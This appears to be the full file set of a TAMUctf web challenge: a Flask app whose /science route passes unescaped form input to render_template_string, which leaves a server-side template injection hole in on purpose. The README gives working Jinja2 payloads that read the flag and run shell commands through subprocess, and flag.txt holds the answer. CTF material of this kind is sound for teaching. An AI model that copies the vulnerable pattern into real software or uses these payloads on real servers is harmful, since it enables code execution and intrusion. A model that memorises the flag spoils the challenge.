{
    "config.py": "import os\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\nWFT_CSRF_ENABLED = True\nSECERT_KEY = \"super-secret\"\n",
    "config.pyc": "[Binary file or unsupported type: pyc]",
    "Dockerfile": "FROM ubuntu:latest \nRUN apt-get update\nRUN apt-get install python-pip authbind -y\n\nRUN mkdir -p /opt/tamuctf\nCOPY ./config.py /opt/tamuctf\nCOPY ./serve.py /opt/tamuctf\nCOPY ./requirements.txt /opt/tamuctf\nCOPY ./tamuctf /opt/tamuctf/tamuctf\nCOPY ./entry.sh /opt/tamuctf\nCOPY ./flag.txt /opt/tamuctf\n\nWORKDIR /opt/tamuctf\nVOLUME [\"/opt/tamuctf\"]\n\nRUN pip install -r requirements.txt\n\nEXPOSE 80\n\nRUN groupadd ctf\nRUN useradd -G ctf --home=/opt/tamuctf webuser\n\nRUN chown -R webuser:webuser /opt/tamuctf\n\nRUN chmod +x /opt/tamuctf/entry.sh\nWORKDIR /opt/tamuctf\nENTRYPOINT [\"./entry.sh\"]\n",
    "entry.sh": "#!/bin/sh\n# Start CTFd\ntouch /etc/authbind/byport/80\nchmod 777 /etc/authbind/byport/80\nwhile true; do\n    su -c \"authbind --deep /usr/bin/python serve.py\" - webuser\ndone\n",
    "flag.txt": "gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}\n",
    "README.md": "# Flask Template Injection\n\nObjective is for the player to use template injection to get a shell on the web server and print the flag.\n\n## Setup\nInstall docker and run `./rundocker.sh`\n\n## Solution\nThe solution is to use the flask injection vulnerability to read the flag off of the server. More background can be found here: https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html  \nand  \nhttps://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html\n\nPossible solutions is to put the follwing in one of the text boxes:  \n`{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag.txt').read() }}`  \nor the following commands seperately:   \n```\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n{{ config.from_pyfile('/tmp/owned.cfg') }}\n{{ config['RUNCMD']('cat flag.txt',shell=True) }}\n```\n",
    "requirements.txt": "Flask==0.12.2\nFlask-SQLAlchemy==2.3.2\nFlask-Session==0.3.1\nFlask-Caching==1.3.3\nFlask-Migrate==2.1.1\nFlask-Script==2.0.6\nrequests==2.18.4\n",
    "rundocker.sh": "#!/bin/sh\nhash=$(sudo docker build . | tail -1 | cut -b 19-31)\necho \"the hash is $hash\"\nsudo docker run -p 8000:8000 -it $hash\n",
    "serve.py": "from tamuctf import app\n\n#app = create_app()\napp.run(debug=False, threaded=True, host=\"0.0.0.0\", port=80)\n",
    "tamuctf\\views.py": "import requests\nimport json\nimport sys\nfrom tamuctf import app\nfrom flask import Flask, render_template, request, jsonify, render_template_string\n\n@app.route('/')\n@app.route('/index')\ndef index():\n    \n    return render_template('index.html')\n\n@app.route('/science', methods=['POST'])\ndef science():\n    try:\n        chem1 = request.form['chem1']\n        chem2 = request.form['chem2']\n        template = '''<html>\n        <div style=\"text-align:center\">\n        <h3>The result of combining {} and {} is:</h3></br>\n        <iframe src=\"https://giphy.com/embed/AQ2tIhLp4cBa\" width=\"468\" height=\"480\" frameBorder=\"0\" class=\"giphy-embed\" allowFullScreen></iframe></div>\n        </html>'''.format(chem1, chem2)\n\n        return render_template_string(template, dir=dir, help=help, locals=locals)\n    except:\n        return \"Something went wrong\"\n\n\n",
    "tamuctf\\__init__.py": "from flask import Flask\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = Flask(__name__)\napp.config.from_object('config')\n\nfrom tamuctf import views\n",
    "tamuctf\\__init__.pyc": "[Binary file or unsupported type: pyc]",
    "tamuctf\\templates\\base.html": "<html>\n  <head>\n    {% if title %}\n    <title>{{ title }} - ECEN404</title>\n    {% else %}\n    <title>ECEN403</title>\n    {% endif %}\n  </head>\n  <body>\n    <div>ECEN403: <a href=\"/index\">Home</a> \n                  <a href=\"/map\">Map</a>\n                  <a href=\"/data\">Data</a>\n    </div>\n    <hr>\n    {% block content %}{% endblock %}\n  </body>\n</html>\n",
    "tamuctf\\templates\\index.html": "{% block content %}\n<html>\n    <div style=\"text-align: center\">\n    <h1>Welcome to my new FaaS! (Flask as a Service)</h1>\n    <h4>Please enter the two chemicals you would like to combine:</h4>\n    <form action=\"/science\" method=\"POST\">\n        Chemical One: <input type=\"text\" name=\"chem1\"><br>\n        Chemical Two: <input type=\"text\" name=\"chem2\"><br>\n        <input type=\"submit\">\n    </form>\n    <br>\n    <br>\n    <iframe src=\"https://giphy.com/embed/fqIBaMWI7m7O8\" width=\"480\" height=\"270\" frameBorder=\"0\" class=\"giphy-embed\" allowFullScreen></iframe><p>\n    </div>\n</html>\n{% endblock %}\n",
    "category": "Web"
}